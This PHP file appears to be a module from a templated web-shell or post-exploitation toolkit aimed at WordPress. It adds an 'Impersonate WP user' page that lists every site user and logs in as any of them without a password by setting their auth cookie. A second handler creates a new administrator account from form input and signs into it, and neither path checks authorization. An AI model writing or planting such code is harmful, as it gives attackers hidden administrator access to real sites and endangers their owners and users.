<?php

// section.constants
$IMPERSONATE_WP_USER = "__FEAT_IMPERSONATE_WP_USER__";
// section.constants.end

// section.functions
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeWpImpersonatePage(&$page_content, $features, $page, $css) {
    $feature = array_values(array_filter($features, function ($feature) use ($page) {
        return $feature["op"] === $page;
    }));

    $users        = __PREFIX__getWPUsers();
    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        array(
            __PREFIX__makePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            __PREFIX__makeTable(
                "Users",
                "WordPress users to impersonate",
                $users,
                array(
                    "user_login" => "Username",
                    "user_email" => "Email",
                    "roles"      => "Roles",
                    "user_url"   => "URL",
                    "actions"    => "Actions",
                ),
                "
                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
                __PREFIX__makeForm(
                    $page,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                            &times;
                                        </button>
                                    </div>",
                        __PREFIX__makeInput(
                            "text",
                            "Username",
                            "__PARAM_2__",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        __PREFIX__makeInput(
                            "password",
                            "Password",
                            "__PARAM_3__",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                        </dialog>
                        <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                hover:bg-zinc-700 transition-all duration-300'>
                            Create user
                        </button>"
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__handleWpImpersonate($operation, $features) {
    // Run the impersonate operation
    if (!empty($_POST["__PARAM_1__"])) {
        if(!function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
           !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
           !function_exists("site_url")){
            return;
        }

        $user = get_user_by("login", $_POST["__PARAM_1__"]);
        if ($user) {
            wp_set_current_user($user->ID, $user->user_login);
            wp_set_auth_cookie($user->ID);
            wp_redirect(site_url());
            die;
        }
    }
    // Run the user creation operation
    elseif (!empty($_POST["__PARAM_2__"]) &&
            !empty($_POST["__PARAM_3__"])) {
        if(!function_exists("wp_insert_user") || !function_exists("is_wp_error") ||
           !function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
           !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
           !function_exists("site_url")){
            return;
        }

        // creates the admin user
        $user_id = wp_insert_user(
            array(
                "user_login" => "__PREFIX__" . $_POST["__PARAM_2__"],
                "user_pass"  => $_POST["__PARAM_3__"],
                "role"       => "administrator",
            )
        );

        // if the user was created successfully, log in
        if (!is_wp_error($user_id)) {
            $user = get_user_by("id", $user_id);
            if ($user) {
                wp_set_current_user($user->ID, $user->user_login);
                wp_set_auth_cookie($user->ID);
                wp_redirect(site_url());
                die;
            }
        }
    }
}

/**
 * Create the table row for the WordPress users
 *
 * @param $data WP_User The WordPress user data
 *
 * @return array The table row
 */
function __PREFIX__makeWpUserTableRow($data) {
    global $IMPERSONATE_WP_USER;

    return array_merge(
        (array) $data->data,
        array(
            "roles"   => $data->roles,
            "actions" => __PREFIX__makeForm(
                $IMPERSONATE_WP_USER,
                $_SERVER["REQUEST_URI"],
                array(
                    __PREFIX__makeInput(
                        "hidden",
                        "username",
                        "__PARAM_1__",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        htmlentities($data->data->user_login)
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            ),
        )
    );
}

/**
 * Get the list of WordPress users
 *
 * @return array List of WordPress users
 */
function __PREFIX__getWPUsers() {
    if(!function_exists("get_users")) {
        return array();
    }

    return array_map(
        "__PREFIX__makeWpUserTableRow",
        get_users()
    );
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function __PREFIX__WpImpersonateHooksIsolatedOps(&$isolated_ops) {
    global $IMPERSONATE_WP_USER;

    $isolated_ops[] = $IMPERSONATE_WP_USER;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__WpImpersonateHooksFeatures(&$features) {
    global $IMPERSONATE_WP_USER;

    $features[] = array(
        "title"       => "Impersonate WP user",
        "description" => "Impersonate a WordPress user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $IMPERSONATE_WP_USER,
    );
}

// section.functions.end

// section.hooks
add_hook("isolated_ops", "__PREFIX__WpImpersonateHooksIsolatedOps");
add_hook("features", "__PREFIX__WpImpersonateHooksFeatures");
add_named_hook("GET_page", $IMPERSONATE_WP_USER, "__PREFIX__makeWpImpersonatePage");
add_named_hook("POST_operation", $IMPERSONATE_WP_USER, "__PREFIX__handleWpImpersonate");
// section.hooks.end